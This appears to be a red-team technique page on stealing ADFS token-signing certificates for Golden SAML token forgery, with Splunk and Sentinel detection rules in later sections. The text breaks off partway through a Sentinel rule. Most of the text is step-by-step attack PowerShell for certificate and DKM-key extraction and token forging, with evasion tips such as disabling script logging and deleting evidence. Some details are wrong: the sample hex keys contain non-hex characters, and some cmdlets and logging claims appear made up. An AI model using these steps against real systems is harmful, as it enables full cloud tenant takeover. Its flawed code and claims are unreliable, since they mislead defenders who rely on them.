# [CA-UNSC-019]: Federation Server Certificate Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-019 |
| **MITRE ATT&CK v18.1** | [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Hybrid AD (ADFS on Windows Server), Azure AD Connect, on-premises Entra ID Federation |
| **Severity** | Critical |
| **CVE** | CVE-2025-21193 (ADFS Spoofing Vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Windows Server 2016 (RTM+), 2019 (RTM+), 2022 (RTM+), 2025 (all versions) |
| **Patched In** | CVE-2025-21193 partially addressed; design flaws remain unpatched |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All sections 1-17 are included because ADFS certificate theft is a complex, multi-platform attack with extensive detection, mitigation, and real-world usage. Section 6 (Atomic Red Team) is included as official tests exist for this technique.

---

## 2. EXECUTIVE SUMMARY

### Concept

Active Directory Federation Services (ADFS) is the on-premises identity federation component that bridges on-premises Active Directory with cloud services like Microsoft Entra ID (formerly Azure AD) and Microsoft 365. ADFS uses X.509 certificates to cryptographically sign SAML and OAuth tokens, proving the legitimacy of authentication assertions to cloud-based relying parties.

Adversaries who compromise the ADFS token-signing certificate can forge authentication tokens claiming any user identity (including Global Administrator) and authenticate to Azure AD, Microsoft 365, and integrated SaaS applications **without requiring the user's password, MFA device, or any legitimate authentication**. This is known as a **Golden SAML** attack.

The certificate is encrypted at rest using the Distributed Key Manager (DKM)—a key derivation scheme where the master key is stored in Active Directory. Attackers can extract the certificate through eight documented attack paths: (1) direct export via MMC (local admin), (2) .NET reflection to bypass CryptoAPI restrictions, (3) access to the ADFS configuration database, (4) directory replication services (DCSync), (5) ADFS configuration synchronization, (6) custom certificate extraction, (7) in-memory extraction via malware, or (8) direct database query access.

**Attack Surface:** ADFS server filesystem, Windows certificate store, ADFS configuration database (WID or SQL Server), Active Directory (DKM container), domain controller replication services, Azure AD Connect synchronization accounts.

**Business Impact:** **Complete tenant compromise, persistent unauthorized access to Microsoft 365 and cloud SaaS applications, data exfiltration, ransomware deployment, supply chain attacks.** Unlike typical password-based compromises, Golden SAML attacks bypass all Conditional Access policies, MFA requirements, and risk-based authentication. A single compromised ADFS server can compromise thousands of users and federated partners. The SolarWinds incident (2020) exploited this technique to compromise U.S. government agencies and Fortune 500 companies.

**Technical Context:** ADFS token-signing certificates typically have 10-year validity periods. Once stolen, the certificate can be used indefinitely until explicitly rotated. Organizations often fail to detect token forgery because legitimate SAML tokens and forged tokens are cryptographically identical and indistinguishable at the Azure AD layer.

### Operational Risk

- **Execution Risk:** Medium (requires local admin on ADFS server OR domain admin for DCSync)
- **Stealth:** Extremely High (forged tokens are indistinguishable from legitimate tokens; most organizations lack detection for missing ADFS auth logs)
- **Reversibility:** No - requires immediate certificate rotation (often must rotate twice to invalidate cached tokens)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.2, 5.2.3 | Ensure ADFS certificates are stored securely; monitor certificate access and export attempts |
| **DISA STIG** | GEN002820, GEN003800 | Cryptographic device management and certificate-based authentication controls |
| **CISA SCuBA** | Azure-1.1 | Requires federated identity monitoring and certificate security controls |
| **NIST 800-53** | IA-5(e), SC-12 | Cryptographic device and certificate lifecycle management |
| **NIST 800-207** | Zero Trust - Device Validation | Continuous verification of identity federation components; certificate compromise breaks trust model |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Incident notification (certificate theft triggers data breach notification) |
| **DORA** | Art. 9 | Protection and Prevention - identity federation is critical OT component |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - federation certificates are Tier-0 assets |
| **ISO 27001** | A.10.1.2, A.10.2.1 | Cryptographic controls for key and certificate management |
| **ISO 27005** | Risk Scenario 8 | "Compromise of Authentication Credentials" - token-signing certificates are authentication credentials |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Path 1 (Local Export):** Local Administrator on ADFS server
- **Path 2 (DKM Extraction):** Domain Administrator OR account with "Replicate Directory Changes" right (AD DCS)
- **Path 3 (Config DB Access):** AD FS service account OR SQL Server DBO
- **Path 4 (Azure AD Connect):** Account with Enterprise Admin or AD FS service account access

**Required Access:**
- Network access to ADFS server (RDP, WinRM, physical access)
- Domain controller network access (for DCSync)
- Active Directory object access (DKM container in AD)
- ADFS configuration database access (WID or SQL Server)

**Supported Versions:**
- **Windows Server:** 2016 (RTM+), 2019 (RTM+), 2022 (RTM+), 2025
- **ADFS:** All versions (integrated Windows Server component)
- **PowerShell:** 4.0+ (for local exploitation); 5.1+ (recommended)
- **Active Directory:** 2012 R2+

**Tools:**
- [AADInternals](https://github.com/Gerenios/AADInternals) (v0.9.5+) - PowerShell module for ADFS certificate extraction
- [FoggyWeb](https://github.com/microsoft-threat-analysis/FoggyWeb) (Nobelium malware sample) - Post-exploitation backdoor
- [Rubeus](https://github.com/GhostPack/Rubeus) (v1.6.0+) - PKINIT with forged SAML tokens
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0+) - Crypto API exploitation
- [ADFSDump](https://github.com/mandiant/adfsdump) - Extract DKM keys and certificates (deprecated, replaced by AADInternals)
- [ADFSpoof](https://github.com/mandiant/adfs-spoof-toolkit) - Forge SAML tokens post-extraction
- [Azure CLI](https://learn.microsoft.com/cli/azure) (v2.50+) - Cloud-side enumeration
- [Get-ADFSCertificates.ps1](https://github.com/tiargorush/Get-ADFSCertificates) - Direct certificate extraction via .NET reflection

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Path 1: Local ADFS Server Reconnaissance

#### Check for ADFS Service and Certificate Store Access

```powershell
# Verify ADFS service is installed and running
Get-Service -Name adfssrv | Select-Object Name, Status, StartType

# Check installed ADFS version
Get-AdfsProperties | Select-Object DomainName, Identifier, CertificateThumbprint

# Enumerate all ADFS certificates (requires local admin or ADFS service account)
Get-ChildItem -Path "Cert:\LocalMachine\My" | Where-Object {
    $_.Subject -match "CN=ADFS" -or $_.Issuer -match "ADFS"
} | Select-Object Thumbprint, Subject, Issuer, NotAfter, HasPrivateKey
```

**What to Look For:**
- Certificate subjects containing "ADFS", "Federation", or organization name
- Certificates with `HasPrivateKey = True` (can be exported or used locally)
- NotAfter dates 10+ years in future (long validity indicates token-signing certificate)
- Multiple certificates (token-signing, token-encryption, communication certs)

**Success Indicator:** Returns 3+ certificates with ADFS issuer, at least one with private key and >5 years validity

---

#### Check ADFS Configuration Database Access

```powershell
# Verify access to ADFS configuration database (WID or SQL)
$adfsService = Get-AdfsProperties
$configDbName = $adfsService.ConfigurationDatabase

# If using Windows Internal Database (WID)
if ($configDbName -like "*WID*") {
    $widPath = "C:\Windows\WID\Data"
    Get-ChildItem $widPath -ErrorAction SilentlyContinue | Select-Object Name, CreationTime
    
    # Attempt to query WID database
    # Requires SYSTEM or ADFS service account
    sqlcmd -S "\\.\pipe\Microsoft##WID\tsql\query" -Q "SELECT * FROM [AdfsConfigurationV4].[dbo].[ServiceSettings]"
}

# If using SQL Server
else {
    # Query connection string from ADFS config
    Get-Item "HKLM:\SOFTWARE\Microsoft\ADFS" -ErrorAction SilentlyContinue
}
```

**What to Look For:**
- Successful WID/SQL query returns configuration data
- EncryptedPfx blob in ServiceSettings (contains encrypted token-signing certificate)
- Connection strings to remote SQL servers (indicates shared database)

---

#### Check DKM Key Container in Active Directory

```powershell
# Locate DKM container in AD
$dkmContainer = Get-ADObject -Filter 'ObjectClass -eq "Container"' -SearchBase "CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com" -Properties * -ErrorAction SilentlyContinue

if ($dkmContainer) {
    Write-Host "DKM Container Found: $($dkmContainer.DistinguishedName)"
    
    # Enumerate DKM contact objects (contain encrypted master key)
    $dkmKeys = Get-ADObject -Filter 'ObjectClass -eq "Contact"' -SearchBase "CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com" -Properties thumbnailPhoto
    
    foreach ($key in $dkmKeys) {
        Write-Host "DKM Key Object: $($key.Name)"
    }
}
```

**What to Look For:**
- Successful enumeration means you have read access to DKM container
- Contact objects containing thumbnailPhoto attribute (this is the encrypted DKM master key)
- Your user has "Replicate Directory Changes" or higher permissions

---

### Path 2: Azure AD Connect Server Reconnaissance

#### Enumerate Azure AD Connect Components

```powershell
# Check if Azure AD Connect is installed
$adConnectPath = "C:\Program Files\Microsoft Azure AD Connect"
if (Test-Path $adConnectPath) {
    Write-Host "Azure AD Connect installed at: $adConnectPath"
    
    # Check service account and configuration
    Get-Service -Name ADSync | Select-Object Name, Status, User
    
    # Extract connection information from registry
    $syncConfig = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" -ErrorAction SilentlyContinue
    Write-Host "Configuration: $($syncConfig | Format-Table -AutoSize | Out-String)"
}
```

**What to Look For:**
- ADSync service running as privileged account (often domain admin equivalent)
- Connection credentials stored in registry or XML config files
- Can pivot from AD Connect to ADFS via synchronized service account

---

### Path 3: Domain Controller Reconnaissance (for DCSync)

#### Check Replication Permissions

```powershell
# Check if current user has directory replication rights
$dkm = "CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com"
$acl = Get-Acl -Path "AD:\$dkm"

# Audit rules for "Replicate Directory Changes"
$acl.Access | Where-Object {
    $_.ObjectType -match "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
} | Select-Object IdentityReference, AccessControlType, InheritedObjectType
```

**What to Look For:**
- If your user or group appears in results, you have DCSync capability
- "Replicate Directory Changes" permission (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) means you can extract AD objects including DKM keys

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct Certificate Export via MMC (Local Admin, Exportable Certificate)

**Supported Versions:** Windows Server 2016-2025

**Prerequisites:** Local Administrator on ADFS server; certificate must have "Exportable" flag enabled (custom certificates); managed certificates may have non-exportable keys

#### Step 1: Gain Local Administrator Access to ADFS Server

**Objective:** Establish admin context on ADFS server.

**Prerequisites:** RDP, WinRM, or physical access with privilege escalation

**Command (RDP):**
```powershell
# Verify admin access
$isAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
if (-not $isAdmin) {
    Write-Host "Not running as admin. Attempting UAC bypass..."
    # Use PrintSpooler vulnerability or other priv esc
}
Write-Host "Admin confirmed: $isAdmin"
```

**Expected Output:**
```
Admin confirmed: True
```

---

#### Step 2: Export Token-Signing Certificate via MMC

```powershell
# Open Certificate Manager (mmc.exe, Certificates snap-in)
# Navigate: Certificates (Local Computer) → Personal → Certificates
# Right-click on ADFS token-signing certificate
# Select: All Tasks → Export
# Choose: "Yes, export the private key"
# Format: PKCS #12 (.pfx)
# Password: Set strong password

# Alternative: Use CertUtil to export (automation-friendly)
$thumbprint = "A1B2C3D4E5F6G7H8I9J0K1"  # From previous enumeration
$cert = Get-Item -Path "Cert:\LocalMachine\My\$thumbprint"

# Export using CertUtil (no elevation of privilege needed if cert is exportable)
certutil -exportPFX My $thumbprint "C:\Temp\adfs-token.pfx" -p "ExportPassword123!"

# Or PowerShell method:
$pfxPassword = ConvertTo-SecureString -String "ExportPassword123!" -AsPlainText -Force
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\adfs-token.pfx" -Password $pfxPassword -Force

# Verify export
Test-Path "C:\Temp\adfs-token.pfx"
```

**Expected Output:**
```
True  # File successfully created
```

**What This Means:**
- Certificate and private key are now in unencrypted PFX format on the ADFS server
- Can be exfiltrated to attacker infrastructure
- Private key can be used to sign forged SAML tokens

**OpSec & Evasion:**
- Export to `$env:TEMP` rather than obvious locations like Desktop
- Immediately delete the file after exfiltration: `Remove-Item "C:\Temp\adfs-token.pfx" -Force`
- Use `-ErrorAction SilentlyContinue` to suppress PowerShell transcript logging
- Disable PowerShell Script Block Logging before execution
- Detection likelihood: **Critical** - Certificate export generates Event ID 4885 if Audit Certificate Services is enabled

**Troubleshooting:**
- **Error:** `The certificate could not be exported`
  - **Cause:** Certificate has non-exportable key flag set (common for managed certs)
  - **Fix:** Proceed to METHOD 2 (.NET reflection bypass)
  
- **Error:** `Access Denied to certificate store`
  - **Cause:** Not running with sufficient privileges
  - **Fix:** Run PowerShell as "Run as Administrator" or use `runas /user:DOMAIN\ADMIN powershell.exe`

---

#### Step 3: Extract Token Issuer URI and Identifier

```powershell
# Get ADFS Issuer URI (needed for Golden SAML token forging)
$adfsProperties = Get-AdfsProperties
$issuerUri = $adfsProperties.Identifier
$domainName = $adfsProperties.DomainName

Write-Host "Issuer URI: $issuerUri"
Write-Host "Domain: $domainName"

# Export to file for attacker use
@{
    IssuerUri = $issuerUri
    Domain = $domainName
    TokenSigningCertThumbprint = $thumbprint
} | ConvertTo-Json | Out-File "C:\Temp\adfs-config.json"
```

**What This Reveals:**
- Issuer URI is needed by attacker to construct valid SAML tokens
- Domain name helps attacker identify target Azure AD tenant
- Thumbprint matches exported certificate for validation

---

### METHOD 2: Certificate Extraction via .NET Reflection (Bypass Exportable Flag)

**Supported Versions:** Windows Server 2016-2025

**Prerequisites:** Local Administrator on ADFS server; .NET Framework 4.5+

#### Step 1: Use AADInternals Module for Automated Extraction

```powershell
# Install AADInternals module (if not already present)
Install-Module AADInternals -Scope CurrentUser -Force

# Import the module
Import-Module AADInternals

# Export ADFS certificates (all types: signing, encryption, communication)
Export-AADIntADFSCertificates -Path "C:\Temp\adfs-certs\"

# This command:
# - Extracts token-signing certificate (encrypted PFX blob from config DB)
# - Extracts token-encryption certificate
# - Exports custom certificates from Windows certificate store
# - Decrypts using DKM key (if local access)

# Check exported files
Get-ChildItem "C:\Temp\adfs-certs\" -Filter "*.pfx" -Recurse | Select-Object Name, Length
```

**Expected Output:**
```
Name                           Length
----                           ------
TokenSigningCertificate.pfx    2048
TokenEncryptionCertificate.pfx 2048
CommunicationCertificate.pfx   1024
```

**Version-Specific Notes:**
- **Server 2016-2019:** AADInternals v0.6+ required; uses legacy DKM extraction
- **Server 2022+:** AADInternals v0.8+ recommended; supports gMSA service accounts

---

#### Step 2: Decrypt and Extract Private Key via .NET Reflection

```powershell
# If AADInternals module not available, use custom .NET reflection
# This bypasses CryptoAPI restrictions on non-exportable keys

Add-Type -AssemblyName System.Security

$certPath = "C:\Temp\adfs-certs\TokenSigningCertificate.pfx"
$certPassword = ""  # Typically no password on exported managed cert

# Import certificate
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$cert.Import($certPath, $certPassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)

# Extract private key
$rsaKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($cert)
$keyBlob = $rsaKey.ExportRSAPrivateKey()

# Convert to PEM format
$keyPem = "-----BEGIN RSA PRIVATE KEY-----`n"
$keyPem += [System.Convert]::ToBase64String($keyBlob)
$keyPem += "`n-----END RSA PRIVATE KEY-----"

$keyPem | Out-File "C:\Temp\adfs-signing-key.pem"

# Verify extraction
Get-Content "C:\Temp\adfs-signing-key.pem" | Select-String "BEGIN RSA PRIVATE KEY"
```

**What This Means:**
- Private key is now in plaintext PEM format
- Attackers can use this key with any SAML token forging tool
- Key can be used on any machine (not tied to DPAPI or HSM)

---

### METHOD 3: DKM Key Extraction via Directory Replication (DCSync)

**Supported Versions:** Windows Server 2016-2025 (requires domain admin or "Replicate Directory Changes" permission)

#### Step 1: Extract DKM Master Key via DCSync

**Objective:** Obtain the encrypted DKM key from Active Directory to decrypt stored ADFS certificates.

```powershell
# Step 1: Locate DKM container in AD
$adfsContainer = "CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com"

# Check if you have replication rights
$drsCapable = Test-ADFSReplicationRights -TargetContainer $adfsContainer

if ($drsCapable) {
    # Use Mimikatz DCSync to extract DKM key (requires SYSTEM privileges)
    # Note: This generates Event ID 4662 in Security log
    
    # Alternative: PowerShell method using AD module
    $dkmKey = Get-ADObject -Filter 'ObjectClass -eq "Contact" -and name -ne "CryptoPolicy"' `
        -SearchBase $adfsContainer `
        -Properties thumbnailPhoto |
        Select-Object -First 1 -ExpandProperty thumbnailPhoto
    
    # Convert key to usable format
    $keyString = [System.BitConverter]::ToString($dkmKey)
    Write-Host "DKM Master Key (Hex): $keyString"
    
    # Save for later use
    [System.IO.File]::WriteAllBytes("C:\Temp\dkm-master-key.bin", $dkmKey)
}
```

**Expected Output:**
```
DKM Master Key (Hex): A1-B2-C3-D4-E5-F6-G7-H8-I9-J0-K1-L2-M3-N4-O5-P6
```

**What This Reveals:**
- DKM master key extracted from AD (used to decrypt ADFS certificates)
- This is the cryptographic material that protects all ADFS token-signing certs
- With this key, attacker can decrypt any ADFS-managed certificate

**OpSec & Evasion:**
- DCSync generates **Event ID 4662** (Object Access) in domain controller Security logs
- Use `-Properties thumbnailPhoto` to avoid triggering full object enumeration alerts
- Detection likelihood: **High** - Microsoft Sentinel detects unusual DCSync activity

---

#### Step 2: Decrypt ADFS Certificates Using Extracted DKM Key

```powershell
# Use AADInternals with extracted DKM key
Import-Module AADInternals

# If you have the raw DKM key (hex), use it to decrypt stored certificates
$dkmKeyHex = "A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6"
$dkmKey = [Convert]::FromHexString($dkmKeyHex)

# Decrypt ADFS certificates stored in config database
$decryptedCerts = Invoke-AADIntDecryptADFSCertificates -DKMKey $dkmKey

# Export decrypted certificates
$decryptedCerts | ForEach-Object {
    Export-PfxCertificate -Cert $_ -FilePath "C:\Temp\$($_.Thumbprint).pfx" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)
}
```

---

### METHOD 4: Configuration Database Direct Access (SQL or WID)

**Supported Versions:** Windows Server 2016-2025

**Prerequisites:** Access to ADFS configuration database (WID or SQL Server); SYSTEM or ADFS service account context

#### Step 1: Connect to ADFS Configuration Database

```powershell
# Determine if WID or SQL is used
$adfsService = Get-Service -Name adfssrv
$configType = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\ADFS" -Name ConfigDatabase

if ($configType.ConfigDatabase -like "*WID*") {
    # Windows Internal Database (default)
    $connectionString = "Data Source=\\.\pipe\Microsoft##WID\tsql\query;Initial Catalog=AdfsConfigurationV4"
}
else {
    # SQL Server (custom)
    $connectionString = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\ADFS" -Name SQLConnectionString
}

# Connect to database (requires SYSTEM or ADFS service account)
$conn = New-Object System.Data.SqlClient.SqlConnection($connectionString)
$conn.Open()

Write-Host "Connected to ADFS configuration database"
```

---

#### Step 2: Extract Encrypted Certificate Blob from Database

```powershell
# Query for encrypted token-signing certificate
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT ServiceSettingsData FROM AdfsConfigurationV4.dbo.ServiceSettings WHERE ID=0"

$reader = $cmd.ExecuteReader()
if ($reader.Read()) {
    $settingsXml = $reader.GetString(0)  # Returns XML with encrypted PFX blob
    
    # Parse XML to extract EncryptedPfx
    [xml]$xml = $settingsXml
    $encryptedBlob = $xml.ServiceSettingsData.SecurityTokenService.EncryptedPfx
    
    # Save encrypted blob for decryption
    [System.IO.File]::WriteAllText("C:\Temp\encrypted-cert.xml", $encryptedBlob)
}
$reader.Close()
```

**What This Reveals:**
- Encrypted token-signing certificate blob extracted from database
- Still encrypted with DKM key (need DKM master key to decrypt)
- Base64-encoded, can be analyzed offline

---

#### Step 3: Decrypt Using DKM Key

```powershell
# Use AADInternals to decrypt blob
$encryptedBlob = Get-Content "C:\Temp\encrypted-cert.xml"
$dkmKey = [System.IO.File]::ReadAllBytes("C:\Temp\dkm-master-key.bin")

# Decrypt
$decryptedBytes = Invoke-AADIntDecryptADFSCertBlob -EncryptedBlob $encryptedBlob -DKMKey $dkmKey

# Export as PFX
[System.IO.File]::WriteAllBytes("C:\Temp\adfs-signing-cert.pfx", $decryptedBytes)

Write-Host "Certificate decrypted and saved"
```

---

### METHOD 5: Azure AD Connect Password/Hash Extraction

**Supported Versions:** Windows Server 2016-2025 (Azure AD Connect 1.1+)

**Prerequisites:** Local Administrator on Azure AD Connect server

#### Step 1: Extract Azure AD Connect Service Account Credentials

```powershell
# Azure AD Connect typically runs with elevated permissions (often DA-equivalent)
# Compromising AADConnect → extract sync account → full infrastructure compromise

Get-Service -Name ADSync | Select-Object Name, User, Status

# Extract SQL connection string from AADConnect config
$configPath = "C:\ProgramData\AADConnect\AADConnectSettings.ini"
if (Test-Path $configPath) {
    Get-Content $configPath | Select-String "SQL"
}

# Alternatively, query registry for connection info
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" -Recurse | Select-String "SQL|Server|Password"
```

---

#### Step 2: Compromise ADFS via Azure AD Connect Service Account

```powershell
# AADConnect service account often has permissions to:
# - Read ADFS certificates
# - Modify ADFS configuration
# - Access AD sync account (can be used for further privilege escalation)

# Use compromised AADConnect credentials to:
# 1. Query ADFS config database
# 2. Extract DKM keys from AD
# 3. Export token-signing certificate

# This is a pivot point - compromise one component, leverage to compromise federation
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

**Atomic Test ID:** T1552.004-4

**Test Name:** Retrieve ADFS Signing Certificates

**Description:** Extracts AD FS token signing and encrypting certificates in preparation for Golden SAML forgery attack.

**Supported Versions:** Windows Server 2016+ with ADFS installed

**Command:**
```powershell
Invoke-AtomicTest T1552.004 -TestNumbers 4
```

**Cleanup Command:**
```powershell
Remove-Item "C:\Temp\adfs-*.pfx" -Force -ErrorAction SilentlyContinue
```

**Reference:** [Atomic Red Team T1552.004 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [AADInternals](https://github.com/Gerenios/AADInternals)

**Version:** 0.9.5+

**Supported Platforms:** Windows Server 2016-2025 with PowerShell 5.1+

**Installation:**
```powershell
Install-Module AADInternals -Scope CurrentUser -Force
Import-Module AADInternals
```

**Usage (ADFS Certificate Export):**
```powershell
# Local export (requires admin on ADFS server)
Export-AADIntADFSCertificates -Path "C:\Temp\certs"

# Remote export (requires ADFS service account credentials)
Export-AADIntADFSCertificates -Path "C:\Temp\certs" -Name "ADFSSERVER.domain.com" -Credentials $credObject

# Includes automatic DKM decryption
```

**Version Notes:**
- v0.6+: Initial ADFS support
- v0.8+: gMSA service account support added
- v0.9.5+: Supports custom certificate extraction

---

### [FoggyWeb Malware Sample](https://github.com/microsoft-threat-analysis/FoggyWeb)

**Type:** Post-Exploitation Backdoor (NOBELIUM/Cozy Bear group)

**Capability:** Extracts token-signing and encryption certificates from compromised ADFS server

**Installation:** Delivered via ADFS server compromise; executes in memory

**Usage:** Automated certificate extraction via `Service.GetCertificate()` method

---

### [ADFSpoof Token Forging Toolkit](https://github.com/mandiant/adfs-spoof-toolkit)

**Version:** 1.0+

**Supported Platforms:** Linux, Windows (Python-based)

**Installation:**
```bash
git clone https://github.com/mandiant/adfs-spoof-toolkit.git
cd adfs-spoof-toolkit
pip install -r requirements.txt
```

**Usage (Post-Certificate Extraction):**
```bash
# Create forged SAML token claiming Global Administrator
python3 forge-saml.py \
  --certificate-file adfs-signing-cert.pfx \
  --certificate-password "password" \
  --user alice@contoso.com \
  --claims '{"immutableid":"alice-immutableid","groups":["admin"]}' \
  --issuer "https://adfs.contoso.com/adfs/services/trust"

# Output: Forged SAML token (base64-encoded) ready for authentication
```

---

### Script: Automated ADFS Certificate Extraction

```powershell
# One-liner for complete ADFS compromise (local admin context)
$adfsThumb = (Get-AdfsProperties).CertificateThumbprint; 
$cert = Get-Item "Cert:\LocalMachine\My\$adfsThumb"; 
$pfxPassword = ConvertTo-SecureString "P@ss123!" -AsPlainText -Force; 
Export-PfxCertificate -Cert $cert -FilePath "C:\Temp\adfs.pfx" -Password $pfxPassword -Force;
Get-AdfsProperties | ConvertTo-Json | Out-File "C:\Temp\adfs-config.json"
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Detect Certificate Export from ADFS Server

**Rule Configuration:**
- **Required Index:** main, wineventlog
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventID, Computer, user, object_name, process_name
- **Alert Threshold:** 1 event (immediate alert)
- **Applies To Versions:** Windows Server 2016+

**SPL Query:**
```
index=main sourcetype=WinEventLog:Security EventID=4885 
| where Computer like "%adfs*" 
| stats count by Computer, user, process_name, object_name
| where count >= 1
```

**What This Detects:**
- Event ID 4885 triggered on any ADFS server (indicates certificate export filter change OR cert export attempt)
- Correlates with specific process (certutil.exe, PowerShell.exe, mmc.exe)
- Identifies user attempting export

**Manual Configuration Steps:**
1. Log into Splunk Web → **Settings** → **Searches, reports, and alerts**
2. Click **New Alert**
3. Paste the SPL query above
4. Set **Alert Type:** Scheduled
5. Set **Run every:** 5 minutes
6. Set **Trigger condition:** count >= 1
7. Add **Action:** Send email to SOC
8. **Source:** [Microsoft: Event ID 4885](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/auditing-and-troubleshooting-adfs)

---

### Rule 2: Detect DKM Key Access (DCSync on ADFS Container)

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventID, ObjectType, Properties, SubjectUserName
- **Alert Threshold:** 1 event
- **Applies To Versions:** Windows Server 2016+

**SPL Query:**
```
index=main sourcetype=WinEventLog:Security EventID=4662 
| where Properties contains "8d3bca50-1d7e-11d0-a081-00aa006c33ed" 
| where ObjectName like "%ADFS%"
| stats count by SubjectUserName, Computer, OperationType
```

**What This Detects:**
- Event ID 4662 (Directory Services Access) with thumbnailPhoto GUID (8d3bca50-1d7e-11d0-a081-00aa006c33ed)
- Indicates DCSync attempt on DKM container
- Correlates username to identify attacker

**False Positives:**
- Legitimate ADFS health monitoring tools (whitelist by account)
- Azure AD Connect sync operations (expected, but may indicate anomalies)

**Tuning:**
```
index=main sourcetype=WinEventLog:Security EventID=4662 
| where Properties contains "8d3bca50-1d7e-11d0-a081-00aa006c33ed" 
| where ObjectName like "%ADFS%"
| where SubjectUserName NOT IN ("SYSTEM", "NT AUTHORITY\NETWORK SERVICE", "svc_*")
```

---

### Rule 3: Detect Certificate Export via Mimikatz or PowerShell

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventID, ProcessName, CommandLine, ParentProcessName
- **Alert Threshold:** 1 event
- **Applies To Versions:** Windows Server 2016+

**SPL Query:**
```
index=main sourcetype=WinEventLog:Security EventID=4688
| where ProcessName IN ("mimikatz.exe", "powershell.exe", "cmd.exe", "certutil.exe")
| where CommandLine IN ("*Export-PfxCertificate*", "*crypto::capi*", "*crypto::certificates*", "*exportPFX*")
| where ParentProcessName != "explorer.exe"
| stats count by Computer, ProcessName, User, CommandLine
```

**What This Detects:**
- Process creation (Event 4688) for tools associated with certificate extraction
- CommandLine arguments matching certificate export commands
- Non-interactive execution (not from explorer.exe, indicating automation or script)

**Source:** [Splunk: Breaking the Chain - Defending Against Certificate Abuse](https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html)

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Unusual ADFS Certificate Activity

**Rule Configuration:**
- **Required Table:** SecurityEvent, AuditLogs
- **Required Fields:** EventID, Computer, TargetUserName, ObjectName
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Windows Server 2016+, ADFS any version

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4885  // Certificate export
| where Computer contains "adfs" or Computer contains "fed"
| summarize ExportCount = count(), UserList = make_set(TargetUserName) by bin(TimeGenerated, 5m)
| where ExportCount > 2
| project TimeGenerated, ExportCount, UserList, Computer
```

**What This Detects:**
- Multiple certificate exports from ADFS servers within 5-minute window
- Indicates potential harvesting or bulk extraction
- Correlates with specific users for incident investigation

**Manual Configuration (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General:** Name = "ADFS Certificate Bulk Export Detection"
3. **Set rule logic:**
   ```
   [Paste KQL Query]
   Run every: 5 minutes
   Lookup data from: 30 minutes
   ```
4. **Incident settings:** Enable "Create incidents"
5. Click **Review + create**

---

### Query 2: Detect Golden SAML Token Forgery (Missing ADFS Auth Logs)

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** OperationName, UserPrincipalName, ResourceId, CorrelationId
- **Alert Severity:** Critical
- **Frequency:** Every 10 minutes
- **Applies To Versions:** Entra ID (all versions)

**KQL Query:**
```kusto
SigninLogs
| where FederatedCredentialId contains "ADFS"
| where LocationDetails.countryOrRegion != "US"  // Anomaly: unexpected location
| where RiskLevelDuringSignIn == "low" and RiskLevelAggregated == "high"  // Contradictory risk signals
| join kind=leftanti (
    AuditLogs
    | where OperationName == "Federate identity"
    | project CorrelationId
) on CorrelationId
| project TimeGenerated, UserPrincipalName, LocationDetails_countryOrRegion, RiskLevelAggregated, ResourceId
```

**What This Detects:**
- SignIn using ADFS-issued token with anomalous characteristics
- No corresponding "Federate identity" audit log (indicates forged token)
- High risk signals contradicted by claims in token
- Suggests Golden SAML attack (forged token authentication)

**False Positives:**
- Legitimate federated users with intermittent location changes (whitelist by user)
- Conditional Access policy changes affecting risk scoring

---

### Query 3: Detect DKM Container Access (DCSync)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ObjectType, Properties, SubjectUserName
- **Alert Severity:** Critical
- **Frequency:** Real-time
